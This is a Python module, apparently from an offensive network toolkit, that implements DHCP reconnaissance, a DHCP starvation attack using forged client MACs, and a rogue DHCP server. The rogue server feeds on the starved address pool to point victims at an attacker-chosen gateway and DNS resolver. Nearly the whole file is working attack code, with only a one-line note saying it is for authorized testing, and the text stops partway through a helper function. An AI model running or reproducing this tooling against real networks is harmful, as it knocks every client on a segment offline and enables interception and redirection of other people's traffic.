"""DHCP starvation and rogue-server jobs (the ``lan dhcp`` session service).

Three capabilities over one attacked segment, in the order they are meant to be
used:

* :meth:`~DhcpService.find` - a single DHCPDISCOVER, reporting every server that
  answers and the settings it hands out. Reconnaissance; nothing is claimed.
* :meth:`~DhcpService.starve_start` - drain the server's address pool by leasing
  every address it will give out, each under its own forged MAC, and keep them
  by renewing at T1 for as long as the job runs.
* :meth:`~DhcpService.server_start` - answer clients from the addresses the
  starve now holds, handing out whatever gateway/DNS the operator chooses. The
  classic use is pointing victims at an attacker-controlled gateway or resolver.

The two attacks are deliberately separate commands because they are separate
decisions: a starve alone is a denial of service, and only becomes a redirection
once a rogue server starts answering the clients it locked out.

Why a starve must keep running
------------------------------
An address is only ours for as long as its lease lasts. The worker therefore
renews at T1 (half the lease) exactly as a real client would, rather than
letting a lease lapse and re-requesting the address afterwards: the moment a
binding expires, the address is back in the server's pool and any real host can
be handed it. Renewal is the job, not a background detail of it - which is why
``starve stop`` without ``--release`` is described as letting the pool "die
naturally" rather than as freeing it.

Per-interface state
-------------------
Everything about one segment lives in a :class:`_Segment`: the pool, the
in-flight transactions, the receive path, the worker, and the rogue server's
configuration. One segment per interface - a starve and the rogue server that
feeds on it are inherently the same link, and they share a single sniffer rather
than opening one each.

Injection requires root; the CLI gates the actions. For authorized security
testing only - starving a production segment takes every client on it offline.
"""

from __future__ import annotations

import ipaddress
import re
import threading
import time
from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Any

from mac_and_seize.core.errors import ModuleError
from mac_and_seize.modules.lan.dhcp import pool as pool_model
from mac_and_seize.modules.lan.dhcp import protocol
from mac_and_seize.modules.lan.dhcp.pool import Lease, Pool, Unavailable
from mac_and_seize.net.adapters import netifaces_io, scapy_io
from mac_and_seize.observability import get_logger
from mac_and_seize.util.format import format_hms
from mac_and_seize.util.parse import split_values

if TYPE_CHECKING:
    from mac_and_seize.core.context import AppContext

#: How long to wait for an OFFER or ACK before retransmitting.
_REPLY_TIMEOUT_S = 2.0

#: Transmissions per DHCP exchange. A broadcast request or its reply is easy to
#: lose on a busy segment, and DHCP has no acknowledgement of its own, so the
#: same frame (same xid - a retransmission, not a new transaction) goes out
#: again before we conclude the server is not answering.
_EXCHANGE_ATTEMPTS = 2

#: Consecutive failed acquisitions that mean the pool is drained. Each costs
#: ``_EXCHANGE_ATTEMPTS * _REPLY_TIMEOUT_S`` of silence, so this is several
#: seconds of a server declining to offer anything - not a one-off drop.
_EXHAUST_STREAK = 3

#: Acquisitions attempted per tick. Bounded so the worker keeps checking its
#: stop event and its renewals while a long drain is in progress, instead of
#: disappearing into one unbroken burst.
_ACQUIRE_PER_TICK = 4

#: Unavailable addresses re-probed per tick, and the minimum gap between two
#: attempts at the *same* address. The retry pass exists because "unavailable"
#: is not permanent - a real host powers off, or the server's range is widened -
#: but an address that just refused us is unlikely to change its mind quickly,
#: so retries stay slow and spread out rather than hammering the server.
_RETRY_PER_TICK = 2
_RETRY_INTERVAL_S = 60.0

#: Backoff after a renewal goes unanswered. Short, because a lease we cannot
#: renew is a lease we are about to lose.
_RENEW_RETRY_S = 10.0

#: Worker cadence. Everything the worker does is deadline-driven, so this only
#: bounds how late an action can be, and how fast a stop is noticed.
_TICK_S = 0.5

#: Default listening window for ``find``. Long enough for a slow server (and
#: for a second one to answer), short enough to block the prompt tolerably.
_FIND_TIMEOUT_S = 5.0

#: How long a rogue OFFER reserves an address for the client it was sent to,
#: so two clients discovering at once are not offered the same address. Roughly
#: a client's window between DISCOVER and REQUEST.
_OFFER_HOLD_S = 10.0

#: Longest lease the rogue server hands out. Capped so a victim comes back to us
#: regularly - each renewal is another chance to keep it pointed at our
#: gateway/DNS, and a shorter lease limits the damage if the attack stops.
_SERVER_LEASE_CAP_S = 1800

#: A lease with less than this left is not handed to a client: we would be
#: promising time we do not hold, and the client would lose the address under it
#: when our own binding lapsed.
_MIN_SERVE_REMAINING_S = 120.0

#: MAC address format (six colon-separated hex bytes).
_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")

#: Argument accepted wherever a value can be inherited from the real server.
_DEFAULT_KEYWORD = "default"

#: Valid values for ``starve stop --release``.
_RELEASE_MODES = ("free", "all")


class _Pending:
    """One in-flight client transaction, awaited by the thread that sent it."""

    __slots__ = ("want", "event", "message")

    def __init__(self, want: set[str]) -> None:
        self.want = want
        self.event = threading.Event()
        self.message: protocol.Message | None = None


@dataclass
class _ServerConfig:
    """What the rogue server puts in every reply.

    ``server_ip`` is the interface's own address, so the host already answers
    ARP for it and a client's unicast renewal arrives without any extra
    machinery on our side. It is also option 54, which is what makes this a
    *server* as far as the client is concerned.
    """

    server_ip: str
    server_mac: str
    gateway: str
    dns: list[str]
    domain: str | None
    ntp: list[str]
    subnet_mask: str | None


@dataclass
class _Segment:
    """One attacked link: its pool, receive path, worker and rogue server."""

    iface: str
    pool: Pool
    lock: threading.RLock = field(default_factory=threading.RLock)
    stop: threading.Event = field(default_factory=threading.Event)
    #: xid -> the transaction waiting on that reply.
    pending: dict[int, _Pending] = field(default_factory=dict)
    #: Every MAC we have forged here, so the rogue server can tell our own
    #: client traffic (which the sniffer sees on the way out) from a victim's.
    client_macs: set[str] = field(default_factory=set)
    #: victim MAC -> (offered address, reservation deadline).
    offered: dict[str, tuple[str, float]] = field(default_factory=dict)
    sniffer: Any = None
    worker: threading.Thread | None = None
    task: Any = None
    server: _ServerConfig | None = None
    server_task: Any = None
    #: Stop acquiring once this many addresses are held (``None`` = no cap).
    limit: int | None = None

    def starving(self) -> bool:
        return self.worker is not None and self.worker.is_alive()


class DhcpService:
    """Session-scoped registry of DHCP starve pools and rogue servers."""

    def __init__(self) -> None:
        self._log = get_logger(__name__)
        self._lock = threading.RLock()
        self._segments: dict[str, _Segment] = {}
        self._context: "AppContext | None" = None

    # --- Public API -----------------------------------------------------------

    def find(
        self, context: "AppContext", interface: str, *, timeout: float | None = None
    ) -> list[dict]:
        """Send one DHCPDISCOVER and report every server that answers.

        Blocks for ``timeout`` seconds - it is a short, bounded probe, and the
        result is only meaningful once the window has closed (a second server
        answering late is exactly what this is looking for).

        Leaves no lease behind: the offers are never accepted, so each server
        holds its address tentatively for a minute or two and then puts it back.
        """
        iface = self._validate_iface(interface)
        wait = _FIND_TIMEOUT_S if timeout is None else float(timeout)
        if wait <= 0:
            raise ValueError("--timeout must be a positive number of seconds.")

        client_mac = protocol.random_client_mac()
        xid = protocol.random_xid()
        offers: dict[str, protocol.Message] = {}
        seen = threading.Lock()

        def collect(packet) -> None:
            message = protocol.parse(packet)
            if message is None or message.kind != "offer" or message.xid != xid:
                return
            with seen:
                # Key by server, not by offer: a server that retransmits must
                # not look like two servers.
                offers.setdefault(message.server_id or message.src_ip, message)

        sniffer = scapy_io.dispatch_sniffer(
            iface, collect, bpf_filter=protocol.BPF_FILTER
        )
        sniffer.start()
        try:
            scapy_io.send_l2(protocol.discover(client_mac, xid), iface)
            time.sleep(wait)
        except OSError as exc:
            raise ModuleError(f"Could not probe on {iface!r}: {exc}") from exc
        finally:
            self._stop_sniffer(sniffer)

        with seen:
            found = list(offers.values())
        if not found:
            raise ModuleError(
                f"No DHCP server answered on {iface} within {wait:g}s. The "
                "segment may have none, or its replies may be filtered."
            )
        return [self._server_row(message) for message in found]

    def starve_start(
        self,
        context: "AppContext",
        interface: str,
        *,
        limit: int | None = None,
    ) -> str:
        """Start draining the segment's DHCP pool in the background."""
        iface = self._validate_iface(interface)
        if limit is not None and limit <= 0:
            raise ValueError("--limit must be a positive number of addresses.")

        with self._lock:
            segment = self._segments.get(iface)
            if segment is not None and segment.starving():
                raise ModuleError(
                    f"A DHCP starve is already running on {iface!r}; stop it "
                    "with 'lan dhcp starve stop'."
                )
            self._context = context
            if segment is None:
                segment = _Segment(iface=iface, pool=Pool(iface=iface))
                self._segments[iface] = segment
            # A restart re-opens acquisition: the pool may have been exhausted
            # against a server whose range has since changed.
            segment.stop = threading.Event()
            segment.limit = limit
            segment.pool.exhausted = False
            self._ensure_sniffer(segment)
            segment.worker = threading.Thread(
                target=self._run,
                args=(segment,),
                name=f"lan-dhcp-starve-{iface}",
                daemon=True,
            )
            segment.task = context.tasks.start(
                context.current_command, stop=lambda name=iface: self._stop_starve(name)
            )
            segment.worker.start()

        cap = f" (up to {limit} address(es))" if limit else ""
        return (
            f"DHCP starve started on {iface}{cap}: leasing every address the "
            "server offers and renewing each at T1 to hold it. Watch progress "
            "with 'lan dhcp starve list'; stop with 'lan dhcp starve stop'."
        )

    def starve_view(self, interface: str | None) -> tuple[list[dict], dict]:
        """Return ``(address rows, subnet-wide info)`` for one pool.

        Reaps expired leases first, so a pool left to age after ``starve stop``
        reports what is actually still held rather than what was held when the
        worker last ran.
        """
        segment = self._resolve_segment(interface)
        now = time.monotonic()
        with segment.lock:
            lost = segment.pool.reap_expired(now)
            rows = pool_model.rows(segment.pool, now)
            info = self._pool_summary(segment, now)
        if lost:
            self._log.info(
                "DHCP pool on %s: %d lease(s) expired and were lost.",
                segment.iface,
                len(lost),
            )
        self._drop_if_idle(segment)
        if not rows:
            raise ModuleError(
                f"The DHCP pool on {segment.iface} is empty - nothing has been "
                "obtained yet. Give 'lan dhcp starve start' a moment, or check "
                "that a DHCP server answered with 'lan dhcp find'."
            )
        return rows, info

    def starve_stop(self, *, release: str | None = None) -> str:
        """Stop every starve job, optionally handing addresses back.

        Without ``release`` the pool is kept and simply stops being renewed, so
        it drains as each lease reaches its own expiry - addresses come back at
        the server's pace, not in one visible burst.
        """
        mode = self._validate_release(release)
        with self._lock:
            segments = list(self._segments.values())
        if not segments:
            raise ModuleError("No DHCP starve pools exist.")

        for segment in segments:
            segment.stop.set()
        for segment in segments:
            self._join_worker(segment)

        parts: list[str] = []
        for segment in segments:
            parts.append(self._finish_starve(segment, mode))
        suffix = {
            None: "Leases will expire on their own; the pool stays listable "
            "until they do.",
            "free": "Idle addresses were handed back; addresses in use by a "
            "client are still held.",
            "all": "Every address was handed back and the pool was discarded.",
        }[mode]
        return f"{'; '.join(parts)}. {suffix}"

    def server_start(
        self,
        context: "AppContext",
        interface: str,
        gateway: str,
        dns: str,
        *,
        domain: str | None = None,
        ntp: str | None = None,
    ) -> str:
        """Start answering DHCP clients from the starved pool."""
        segment = self._resolve_segment(interface)
        with segment.lock:
            if segment.server is not None:
                raise ModuleError(
                    f"A rogue DHCP server is already running on "
                    f"{segment.iface!r}; stop it with 'lan dhcp server stop'."
                )
            available = len(segment.pool.free_leases())
            subnet = segment.pool.subnet
            if not available:
                raise ModuleError(
                    f"No idle addresses in the pool on {segment.iface}: a rogue "
                    "server can only hand out what the starve has taken. Run "
                    "'lan dhcp starve start' and let it obtain some first."
                )
            config = _ServerConfig(
                server_ip="",
                server_mac="",
                gateway=self._resolve_option(
                    gateway, subnet.gateway, "gateway", single=True
                ),
                dns=self._resolve_option(dns, subnet.dns, "DNS server"),
                domain=(
                    self._resolve_text(domain, subnet.domain, "domain name")
                    if domain
                    else None
                ),
                ntp=(
                    self._resolve_option(ntp, subnet.ntp, "NTP server")
                    if ntp
                    else []
                ),
                subnet_mask=subnet.subnet_mask,
            )

        server_ip, server_mac = self._interface_identity(segment.iface)
        config.server_ip = server_ip
        config.server_mac = server_mac

        with segment.lock:
            self._ensure_sniffer(segment)
            segment.server = config
            self._context = context
            segment.server_task = context.tasks.start(
                context.current_command,
                stop=lambda name=segment.iface: self._stop_server(name),
            )

        return (
            f"Rogue DHCP server started on {segment.iface} as {server_ip}: "
            f"offering {available} address(es) from the starved pool, gateway "
            f"{config.gateway}, DNS {', '.join(config.dns)}. "
            "Stop it with 'lan dhcp server stop'."
        )

    def server_stop(self) -> str:
        """Stop every rogue server; its addresses go back to the idle pool."""
        with self._lock:
            segments = [s for s in self._segments.values() if s.server is not None]
        if not segments:
            raise ModuleError("No rogue DHCP server is running.")
        parts = []
        for segment in segments:
            parts.append(self._stop_server(segment.iface))
        return "; ".join(parts)

    # --- Worker ---------------------------------------------------------------

    def _run(self, segment: _Segment) -> None:
        """Drain, hold and re-probe the pool until asked to stop."""
        try:
            while not segment.stop.is_set():
                now = time.monotonic()
                with segment.lock:
                    segment.pool.reap_expired(now)
                    segment.offered = {
                        mac: entry
                        for mac, entry in segment.offered.items()
                        if entry[1] > now
                    }
                # Renewals come first: holding what we have beats taking more.
                self._renew_due(segment)
                if not segment.stop.is_set():
                    self._acquire(segment)
                if not segment.stop.is_set():
                    self._retry_taken(segment)
                segment.stop.wait(_TICK_S)
        except Exception:  # noqa: BLE001 - a crashed worker must still finalize
            self._log.exception(
                "DHCP starve worker for %s crashed", segment.iface
            )
        finally:
            context = self._context
            if segment.task is not None and context is not None:
                context.tasks.finish(segment.task)
                segment.task = None

    def _acquire(self, segment: _Segment) -> None:
        """Lease as many fresh addresses as this tick allows."""
        with segment.lock:
            if segment.pool.exhausted or self._at_limit(segment):
                return
        failures = 0
        for _ in range(_ACQUIRE_PER_TICK):
            if segment.stop.is_set():
                return
            lease = self._obtain(segment)
            if lease is None:
                failures += 1
                if failures >= _EXHAUST_STREAK:
                    with segment.lock:
                        segment.pool.exhausted = True
                        # Whatever is still missing now is something the server
                        # will not give us - that is what makes it "taken".
                        segment.pool.seed_unavailable()
                        held = len(segment.pool.leases)
                    self._log.info(
                        "DHCP starve on %s drained the pool: %d address(es) held.",
                        segment.iface,
                        held,
                    )
                    return
                continue
            failures = 0
            with segment.lock:
                segment.pool.leases[lease.ip] = lease
                segment.pool.unavailable.pop(lease.ip, None)
                if self._at_limit(segment):
                    return

    def _retry_taken(self, segment: _Segment) -> None:
        """Re-probe a few addresses we could not get, oldest attempt first."""
        now = time.monotonic()
        with segment.lock:
            if self._at_limit(segment):
                return
            candidates = sorted(
                (
                    entry
                    for entry in segment.pool.unavailable.values()
                    if entry.last_try is None
                    or now - entry.last_try >= _RETRY_INTERVAL_S
                ),
                key=lambda entry: entry.last_try or 0.0,
            )[:_RETRY_PER_TICK]
        for entry in candidates:
            if segment.stop.is_set():
                return
            with segment.lock:
                entry.last_try = time.monotonic()
                entry.attempts += 1
            # The server may ignore the hint and offer something else entirely;
            # that is still an address worth having, filed under what we got.
            lease = self._obtain(segment, requested_ip=entry.ip)
            if lease is None:
                continue
            with segment.lock:
                segment.pool.leases[lease.ip] = lease
                segment.pool.unavailable.pop(lease.ip, None)

    def _obtain(
        self, segment: _Segment, *, requested_ip: str | None = None
    ) -> Lease | None:
        """Run one full DISCOVER/OFFER/REQUEST/ACK exchange for one address."""
        client_mac = protocol.random_client_mac()
        xid = protocol.random_xid()
        obtained: Lease | None = None
        with segment.lock:
            segment.client_macs.add(client_mac)
        try:
            offer = self._exchange(
                segment,
                protocol.discover(client_mac, xid, requested_ip=requested_ip),
                xid,
                {"offer"},
            )
            if offer is None or offer.your_ip in ("", protocol.UNSPECIFIED_IP):
                return None
            with segment.lock:
                # A server with nothing left sometimes re-offers an address we
                # already hold. Taking it again would orphan the binding the
                # first lease is filed under, so treat it as a failed attempt -
                # which is also exactly the signal that the pool is drained.
                if offer.your_ip in segment.pool.leases:
                    return None
            server_id = offer.server_id or offer.src_ip
            if not server_id:
                return None
            ack = self._exchange(
                segment,
                protocol.select(client_mac, xid, offer.your_ip, server_id),
                xid,
                {"ack", "nak"},
            )
            if ack is None or ack.kind != "ack":
                return None
            with segment.lock:
                segment.pool.subnet.update(offer)
                segment.pool.subnet.update(ack)
            obtained = Lease.from_reply(ack, client_mac, time.monotonic())
            return obtained
        finally:
            # A MAC that took a lease has to stay known for as long as the
            # session lasts: the rogue server checks this set on every frame to
            # avoid answering our own forged clients, and it must not start
            # serving one just because its lease later lapsed. A MAC that never
            # got anything is dropped, so a long drain against an exhausted
            # server doesn't grow the set with every failed attempt.
            if obtained is None:
                with segment.lock:
                    segment.client_macs.discard(client_mac)

    def _renew_due(self, segment: _Segment) -> None:
        """Renew every lease that has reached T1."""
        now = time.monotonic()
        with segment.lock:
            due = [
                lease
                for lease in segment.pool.leases.values()
                if now >= lease.renew_at
            ]
        for lease in due:
            if segment.stop.is_set():
                return
            self._renew(segment, lease)

    def _renew(self, segment: _Segment, lease: Lease) -> None:
        """Extend one lease: unicast at T1, broadcast once past T2."""
        now = time.monotonic()
        xid = protocol.random_xid()
        if now >= lease.rebind_at:
            # Past T2 the original server has stopped answering us; ask the
            # whole segment before the binding lapses.
            frame = protocol.rebind(lease.client_mac, xid, lease.ip)
        else:
            frame = protocol.renew(
                lease.client_mac, xid, lease.ip, lease.server_id, lease.server_mac
            )
        reply = self._exchange(segment, frame, xid, {"ack", "nak"})
        with segment.lock:
            if segment.pool.leases.get(lease.ip) is not lease:
                return  # reaped or replaced while we were waiting
            if reply is not None and reply.kind == "ack":
                lease.renewed(reply, time.monotonic())
                segment.pool.subnet.update(reply)
                return
            if reply is not None and reply.kind == "nak":
                # The server has repudiated the binding - the address is gone.
                del segment.pool.leases[lease.ip]
                segment.pool.unavailable[lease.ip] = Unavailable(
                    ip=lease.ip, last_try=time.monotonic(), attempts=1
                )
                self._log.info(
                    "DHCP starve on %s lost %s: server refused the renewal.",
                    segment.iface,
                    lease.ip,
                )
                return
            lease.renew_at = time.monotonic() + _RENEW_RETRY_S

    def _exchange(
        self, segment: _Segment, frame, xid: int, want: set[str]
    ) -> protocol.Message | None:
        """Send ``frame`` and wait for a reply of a wanted kind, or give up."""
        pending = _Pending(want)
        with segment.lock:
            segment.pending[xid] = pending
        try:
            for _ in range(_EXCHANGE_ATTEMPTS):
                if segment.stop.is_set():
                    return None
                try:
                    scapy_io.send_l2(frame, segment.iface)
                except OSError as exc:
                    self._log.debug(
                        "DHCP: send on %s failed: %s", segment.iface, exc
                    )
                    return None
                if pending.event.wait(_REPLY_TIMEOUT_S):
                    return pending.message
            return None
        finally:
            with segment.lock:
                segment.pending.pop(xid, None)

    # --- Receive path ---------------------------------------------------------

    def _on_packet(self, segment: _Segment, packet) -> None:
        """Dispatch one sniffed frame. Runs on the sniffer's thread."""
        try:
            message = protocol.parse(packet)
            if message is None:
                return
            with segment.lock:
                pending = segment.pending.get(message.xid)
                ours = message.client_mac in segment.client_macs
            if pending is not None and message.kind in pending.want:
                pending.message = message
                pending.event.set()
                return
            # Our own transmissions come back through the capture path too, so
            # anything wearing a MAC we forged is us, not a client to serve.
            if ours or message.kind not in protocol.CLIENT_MESSAGES:
                return
            self._serve(segment, message)
        except Exception:  # noqa: BLE001 - never let a bad frame kill the sniffer
            self._log.exception("DHCP: failed to handle a frame on %s", segment.iface)

    def _serve(self, segment: _Segment, message: protocol.Message) -> None:
        """Answer one client message from the pool, if a rogue server is up."""
        now = time.monotonic()
        with segment.lock:
            config = segment.server
            if config is None:
                return
            if message.kind in ("release", "decline"):
                self._reclaim(segment, message)
                return
            if message.kind == "discover":
                lease = self._pick_for(segment, message, now)
                if lease is None:
                    return
                segment.offered[message.client_mac] = (lease.ip, now + _OFFER_HOLD_S)
                frame = self._reply("offer", config, message, lease, now)
            else:  # request
                frame = self._answer_request(segment, config, message, now)
                if frame is None:
                    return
        try:
            scapy_io.send_l2(frame, segment.iface)
        except OSError as exc:
            self._log.debug("DHCP server: reply on %s failed: %s", segment.iface, exc)

    def _answer_request(
        self,
        segment: _Segment,
        config: _ServerConfig,
        message: protocol.Message,
        now: float,
    ):
        """Build the ACK or NAK answering a client's REQUEST. Caller holds the lock."""
        selected = message.server_id
        if selected and selected != config.server_ip:
            # The client picked a different server - drop our reservation so the
            # address goes back to the pool instead of idling until it lapses.
            segment.offered.pop(message.client_mac, None)
            return None
        wanted = message.requested_ip or message.client_ip
        if not wanted or wanted == protocol.UNSPECIFIED_IP:
            return protocol.server_nak(
                message, server_mac=config.server_mac, server_ip=config.server_ip
            )
        lease = segment.pool.leases.get(wanted)
        if lease is None or (
            lease.holder_mac is not None and lease.holder_mac != message.client_mac
        ):
            # We do not hold it, or somebody else does: tell the client to
            # start over rather than let it use an address we cannot back.
            return protocol.server_nak(
                message, server_mac=config.server_mac, server_ip=config.server_ip
            )
        if lease.remaining(now) < _MIN_SERVE_REMAINING_S:
            return protocol.server_nak(
                message, server_mac=config.server_mac, server_ip=config.server_ip
            )
        frame = self._reply("ack", config, message, lease, now)
        lease.holder_mac = message.client_mac
        lease.holder_until = now + self._offered_lease(lease, now)
        segment.offered.pop(message.client_mac, None)
        return frame

    def _pick_for(
        self, segment: _Segment, message: protocol.Message, now: float
    ) -> Lease | None:
        """Choose the address to offer a client. Caller holds the lock."""
        # Stay consistent: a client that already has one of our addresses, or an
        # outstanding offer, gets the same address again rather than a new one.
        existing = next(
            (
                lease
                for lease in segment.pool.leases.values()
                if lease.holder_mac == message.client_mac
            ),
            None,
        )
        if existing is not None:
            return existing
        reserved = segment.offered.get(message.client_mac)
        if reserved is not None:
            lease = segment.pool.leases.get(reserved[0])
            if lease is not None and lease.holder_mac is None:
                return lease
        taken = {ip for ip, deadline in segment.offered.values() if deadline > now}
        for lease in sorted(segment.pool.free_leases(), key=lambda item: item.ip):
            if lease.ip in taken:
                continue
            if lease.remaining(now) >= _MIN_SERVE_REMAINING_S:
                return lease
        return None

    def _reclaim(self, segment: _Segment, message: protocol.Message) -> None:
        """Return whatever a client just gave up to the idle pool."""
        for lease in segment.pool.leases.values():
            if lease.holder_mac == message.client_mac:
                lease.holder_mac = None
                lease.holder_until = None
        segment.offered.pop(message.client_mac, None)

    def _offered_lease(self, lease: Lease, now: float) -> float:
        """How long we may promise an address: never more than we hold."""
        return min(lease.remaining(now), float(_SERVER_LEASE_CAP_S))

    def _reply(
        self,
        kind: str,
        config: _ServerConfig,
        message: protocol.Message,
        lease: Lease,
        now: float,
    ):
        """Build one OFFER/ACK for ``lease`` with the operator's settings."""
        return protocol.server_reply(
            kind,
            message,
            server_mac=config.server_mac,
            server_ip=config.server_ip,
            your_ip=lease.ip,
            lease_time=int(self._offered_lease(lease, now)),
            subnet_mask=config.subnet_mask,
            routers=[config.gateway],
            name_servers=config.dns,
            domain=config.domain,
            ntp_servers=config.ntp,
        )

    # --- Lifecycle ------------------------------------------------------------

    def _ensure_sniffer(self, segment: _Segment) -> None:
        """Start the segment's receive path if it isn't already up."""
        if segment.sniffer is not None:
            return
        scapy_io.refresh_interfaces()
        sniffer = scapy_io.dispatch_sniffer(
            segment.iface,
            lambda packet, seg=segment: self._on_packet(seg, packet),
            bpf_filter=protocol.BPF_FILTER,
        )
        try:
            sniffer.start()
        except OSError as exc:
            raise ModuleError(
                f"Could not listen for DHCP on {segment.iface!r}: {exc}"
            ) from exc
        segment.sniffer = sniffer

    def _stop_sniffer(self, sniffer) -> None:
        """Stop a sniffer, tolerating one that never fully started."""
        try:
            if getattr(sniffer, "running", False):
                sniffer.stop()
        except Exception:  # noqa: BLE001 - teardown must not raise at the prompt
            self._log.debug("DHCP: sniffer stop failed", exc_info=True)

    def _stop_starve(self, iface: str) -> None:
        """Task-registry stop hook for one segment's worker."""
        with self._lock:
            segment = self._segments.get(iface)
        if segment is None:
            return
        segment.stop.set()
        self._join_worker(segment)

    def _stop_server(self, iface: str) -> str:
        """Stop one rogue server; its addresses return to the idle pool."""
        with self._lock:
            segment = self._segments.get(iface)
        if segment is None or segment.server is None:
            return f"No rogue DHCP server on {iface}."
        with segment.lock:
            returned = len(segment.pool.held_leases())
            for lease in segment.pool.leases.values():
                # The client keeps using the address until its own lease runs
                # out; we simply stop reserving it. Our binding with the real
                # server is untouched, so nothing is handed back here.
                lease.holder_mac = None
                lease.holder_until = None
            segment.offered.clear()
            segment.server = None
            task, segment.server_task = segment.server_task, None
        context = self._context
        if task is not None and context is not None:
            context.tasks.finish(task)
        self._drop_if_idle(segment)
        return (
            f"Rogue DHCP server on {iface} stopped; {returned} address(es) "
            "returned to the idle pool"
        )

    def _join_worker(self, segment: _Segment) -> None:
        """Wait for a signalled worker to wind down."""
        worker = segment.worker
        if (
            worker is not None
            and worker.is_alive()
            and worker is not threading.current_thread()
        ):
            worker.join(timeout=_REPLY_TIMEOUT_S * _EXCHANGE_ATTEMPTS + 1.0)
        segment.worker = None

    def _finish_starve(self, segment: _Segment, mode: str | None) -> str:
        """Apply a stop's release mode to one segment and describe the result."""
        with segment.lock:
            held = len(segment.pool.leases)
            in_use = len(segment.pool.held_leases())
            if mode is None:
                self._drop_if_idle(segment)
                return (
                    f"{segment.iface}: stopped renewing {held} address(es)"
                    + (f", {in_use} still in use by a client" if in_use else "")
                )
            targets = (
                segment.pool.free_leases()
                if mode == "free"
                else list(segment.pool.leases.values())
            )
        if mode == "all":
            self._stop_server(segment.iface)
        released = self._release(segment, targets)
        with segment.lock:
            for lease in targets:
                segment.pool.leases.pop(lease.ip, None)
                segment.pool.unavailable.pop(lease.ip, None)
        if mode == "all":
            self._teardown(segment)
        else:
            self._drop_if_idle(segment)
        return f"{segment.iface}: released {released} address(es)"

    def _release(self, segment: _Segment, leases: list[Lease]) -> int:
        """Send a DHCPRELEASE for each lease; returns how many went out.

        DHCP defines no reply to a release, so this is fire-and-forget: all we
        can report is what we sent, not what the server did with it.
        """
        sent = 0
        for lease in leases:
            frame = protocol.release(
                lease.client_mac,
                protocol.random_xid(),
                lease.ip,
                lease.server_id,
                lease.server_mac,
            )
            try:
                scapy_io.send_l2(frame, segment.iface)
                sent += 1
            except OSError as exc:
                self._log.debug(
                    "DHCP release for %s on %s failed: %s",
                    lease.ip,
                    segment.iface,
                    exc,
                )
        return sent

    def _teardown(self, segment: _Segment) -> None:
        """Drop a segment entirely: stop its receive path and forget it."""
        self._stop_sniffer(segment.sniffer)
        segment.sniffer = None
        with self._lock:
            if self._segments.get(segment.iface) is segment:
                del self._segments[segment.iface]

    def _drop_if_idle(self, segment: _Segment) -> None:
        """Discard a segment with nothing left to hold open."""
        with segment.lock:
            busy = (
                segment.starving()
                or segment.server is not None
                or segment.pool.leases
                or segment.pool.unavailable
            )
        if not busy:
            self._teardown(segment)

    # --- Helpers --------------------------------------------------------------

    def _at_limit(self, segment: _Segment) -> bool:
        """Whether the pool has reached its ``--limit``. Caller holds the lock."""
        return (
            segment.limit is not None and len(segment.pool.leases) >= segment.limit
        )

    def _resolve_segment(self, interface: str | None) -> _Segment:
        """Find the pool to act on, defaulting to the only one that exists."""
        with self._lock:
            if interface:
                iface = interface.strip()
                segment = self._segments.get(iface)
                if segment is None:
                    raise ModuleError(
                        f"No DHCP pool on {iface!r}. Start one with "
                        "'lan dhcp starve start'."
                    )
                return segment
            if not self._segments:
                raise ModuleError(
                    "No DHCP pool exists. Start one with 'lan dhcp starve start'."
                )
            if len(self._segments) > 1:
                names = ", ".join(sorted(self._segments))
                raise ValueError(
                    f"Several DHCP pools exist ({names}); name the interface."
                )
            return next(iter(self._segments.values()))

    def _pool_summary(self, segment: _Segment, now: float) -> dict:
        """The subnet-wide block shown under ``starve list``. Caller holds the lock."""
        info = segment.pool.subnet.as_row()
        free = len(segment.pool.free_leases())
        in_use = len(segment.pool.held_leases())
        network = segment.pool.subnet.network
        oversized = False
        if network:
            try:
                oversized = (
                    ipaddress.ip_network(network, strict=False).num_addresses
                    > pool_model.MAX_SUBNET_ADDRESSES
                )
            except ValueError:
                oversized = False
        info.update(
            {
                "interface": segment.iface,
                "held": f"{free} idle, {in_use} in use",
                "unobtained": str(len(segment.pool.unavailable)),
                "starving": "yes" if segment.starving() else "no",
                "rogue server": (
                    segment.server.server_ip if segment.server else "not running"
                ),
            }
        )
        if oversized:
            info["listing"] = (
                f"known addresses only - the subnet exceeds "
                f"{pool_model.MAX_SUBNET_ADDRESSES} addresses"
            )
        return info

    def _server_row(self, message: protocol.Message) -> dict:
        """Render one answering server as a ``find`` row."""
        options = message.options
        lease = protocol.option_int(options, "lease_time")
        return {
            "server": message.server_id or message.src_ip,
            "mac": message.src_mac or "-",
            "offered": message.your_ip,
            "mask": str(options.get("subnet_mask") or "-"),
            "gateway": ", ".join(protocol.option_ips(options, "router")) or "-",
            "dns": ", ".join(protocol.option_ips(options, "name_server")) or "-",
            "domain": protocol.option_text(options, "domain") or "-",
            "ntp": ", ".join(protocol.option_ips(options, "NTP_server")) or "-",
            "lease": format_hms(lease) if lease else "-",
        }

    def _interface_identity(self, iface: str) -> tuple[str, str]:
        """Return the interface's own ``(ipv4, mac)``, which the server replies as."""
        ipv4, _ipv6, mac = netifaces_io.read_addresses(iface)
        address = next((item for item in (ipv4.get("addr") or []) if item), None)
        hardware = next((item for item in (mac.get("addr") or []) if item), None)
        if not address:
            raise ModuleError(
                f"{iface} has no IPv4 address, so a rogue server has nothing to "
                "identify itself as (clients unicast their renewals to it). "
                "Give the interface an address first."
            )
        if not hardware:
            raise ModuleError(f"Could not read the MAC address of {iface}.")
        return str(address), str(hardware).lower()

    def _resolve_option(
        self, raw: str, fallback: list[str] | str | None, label: str, *, single=False
    ) -> list[str] | str:
        """Resolve an address argument, expanding the ``default`` keyword.

        ``default`` means "whatever the real server hands out", which only works
        once a starve has actually seen an offer carrying that option.
        """
        text = (raw or "").strip()
        if not text:
            raise ValueError(f"A {label} is required.")
        if text.lower() == _DEFAULT_KEYWORD:
            values = [fallback] if isinstance(fallback, str) else list(fallback or [])
            values = [value for value in values if value]
            if not values:
                raise ModuleError(
                    f"'{_DEFAULT_KEYWORD}' needs a {label} learned from the real "
                    "DHCP server, but none was seen. Check 'lan dhcp starve "
                    f"list' - if the {label} column is empty, name one explicitly."
                )
            return values[0] if single else values
        values = [self._validate_ip(value, label) for value in split_values(text)]
        if single and len(values) != 1:
            raise ValueError(f"Give exactly one {label}, not {len(values)}.")
        return values[0] if single else values

    def _resolve_text(self, raw: str, fallback: str | None, label: str) -> str:
        """Resolve a free-text argument, expanding the ``default`` keyword."""
        text = (raw or "").strip()
